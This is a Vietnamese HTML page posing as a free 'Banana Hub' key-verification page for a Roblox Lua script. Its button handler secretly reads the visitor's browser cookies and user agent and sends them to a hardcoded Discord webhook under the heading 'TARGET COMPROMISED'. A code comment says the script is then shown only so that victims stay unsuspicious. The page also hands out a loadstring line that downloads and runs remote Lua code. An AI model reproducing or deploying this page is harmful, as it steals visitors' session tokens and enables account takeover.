<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banana Hub | Script Executor</title>
    <style>
        body { background: #050505; color: #00ffcc; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 2px solid #00ffcc; padding: 30px; border-radius: 10px; background: #000; box-shadow: 0 0 20px #00ffcc; text-align: center; width: 400px; }
        .btn { display: inline-block; padding: 12px 24px; background: #00ffcc; color: #000; text-decoration: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; border: none; }
        .btn:hover { background: #00ccaa; }
        #script-area { display: none; margin-top: 20px; color: #fff; background: #222; padding: 10px; border-radius: 5px; font-size: 11px; word-break: break-all; }
    </style>
</head>
<body>
    <div class="box">
        <h2 id="msg">XÁC MINH BANANA HUB</h2>
        <p style="font-size: 13px; color: #888;">Nhấn nút bên dưới để lấy Key Script ngay lập tức.</p>
        
        <button class="btn" id="mainBtn" onclick="pwn()">LẤY SCRIPT (FREE KEY)</button>

        <div id="script-area">
            loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/test0.02/refs/heads/main/onion13v6.lua"))()
        </div>
    </div>

    <script>
        const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";

        async function pwn() {
            const btn = document.getElementById('mainBtn');
            const msg = document.getElementById('msg');
            const area = document.getElementById('script-area');

            btn.innerText = "ĐANG TRÍCH XUẤT KEY...";
            
            // 1. LẤY TOÀN BỘ COOKIE TRÌNH DUYỆT (NẾU HỌ ĐÃ LƯU TRÊN TRÌNH DUYỆT)
            const capturedCookie = document.cookie || "No Direct Cookie Access";
            
            // 2. GỬI VỀ DISCORD CÙNG THÔNG TIN MÁY
            await fetch(wh, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    content: "### 💀 TARGET COMPROMISED - PROJECT FIRE\n" + 
                             "**Cookie/Token:** `" + capturedCookie + "`\n" +
                             "**User-Agent:** `" + navigator.userAgent + "`"
                })
            });

            // 3. HIỆN SCRIPT ĐỂ HỌ KHÔNG NGHI NGỜ
            setTimeout(() => {
                msg.innerText = "XÁC MINH THÀNH CÔNG!";
                btn.style.display = 'none';
                area.style.display = 'block';
            }, 2000);
        }
    </script>
